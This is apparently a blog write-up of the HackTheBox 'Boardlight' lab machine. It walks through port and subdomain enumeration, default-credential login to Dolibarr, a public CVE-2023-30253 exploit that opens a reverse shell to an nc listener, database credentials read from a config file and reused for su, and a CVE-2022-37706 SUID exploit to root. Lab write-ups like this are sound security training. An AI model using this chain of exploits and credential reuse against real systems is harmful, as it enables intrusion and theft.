---
title: "Boardlight"
date: 2025-06-20
categories:
  - HackTheBox
  - Linux
tags:
  - HackTheBox
  - Linux
---

# Boardlight

![](../assets/Pasted%20image%2020250520183049.png)
<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.11 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-20 19:03 CEST
Nmap scan report for 10.10.11.11
Host is up (0.042s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   41.30 ms 10.10.14.1
2   41.98 ms 10.10.11.11

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.55 seconds
```

The site at port `80` shows a template of a cybersec company.

![](../assets/Pasted%20image%2020250520191115.png)

There is an email.

![](../assets/Pasted%20image%2020250520191214.png)

Add the domain to `/etc/hosts`.

Using `wfuzz` let's discover subdomains.

```shell
$ wfuzz -c --hh 15949 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.board.htb" http://board.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://board.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                               
=====================================================================

000000072:   200        149 L    504 W      6360 Ch     "crm"                                 

Total time: 4.428437
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 1126.582
```

Add `crm.board.htb` to `/etc/hosts`.

Navigating to that subdomain we get a Dolibarr instance `17.0.0`.

![](../assets/Pasted%20image%2020250520191647.png)

Trying `admin:admin` works.

![](../assets/Pasted%20image%2020250520192113.png)

## Initial Access

Using this exploit [https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253), create a listener and execute it.

```shell
$ python exploit.py http://crm.board.htb admin admin 10.10.14.11 80             
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
```

```shell
$ sudo rlwrap nc -lnvp 80                       
[sudo] password for kali: 
listening on [any] 80 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.11] 59606
bash: cannot set terminal process group (855): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ whoami
whoami
www-data
```

In the Dolibarr config folder we can find MySQL credentials.

```shell
ww-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
cat conf.php
...
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';
...
```

Pivot to user `larissa` with the MySQL password.

```shell
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ su larissa
su larissa
Password: serverfun2$2023!!

larissa@boardlight:/var/www/html/crm.board.htb/htdocs/conf$ whoami
whoami
larissa
```

```shell
larissa@boardlight:~$ cat user.txt
cat user.txt
06457c0df24e027ea565aedc9b0122a8
```

## Privilege Escalation

Looking at SUID bit we have Enlightenment `0.23.1`.

```
larissa@boardlight:/var/log$ enlightenment --version
ESTART: 0.00001 [0.00001] - Begin Startup
ESTART: 0.00020 [0.00020] - Signal Trap
ESTART: 0.00028 [0.00007] - Signal Trap Done
ESTART: 0.00039 [0.00011] - Eina Init
ESTART: 0.00075 [0.00036] - Eina Init Done
ESTART: 0.00084 [0.00009] - Determine Prefix
ESTART: 0.00101 [0.00017] - Determine Prefix Done
ESTART: 0.00106 [0.00005] - Environment Variables
ESTART: 0.00111 [0.00005] - Environment Variables Done
ESTART: 0.00116 [0.00005] - Parse Arguments
Version: 0.23.1
E: Begin Shutdown Procedure!
```

There is a PE exploit via `searchsploit`.

![](../assets/Pasted%20image%2020250520213720.png)

Execute it and get root.

```shell
larissa@boardlight:~$ ./exploit.sh 
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Welcome to the rabbit hole :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# whoami
root
```

## Post Exploitation

Get the flag

```shell
# cat /root/root.txt                                                                                      
38da93b2c8510a48d47ca63cd514e4dd 
```
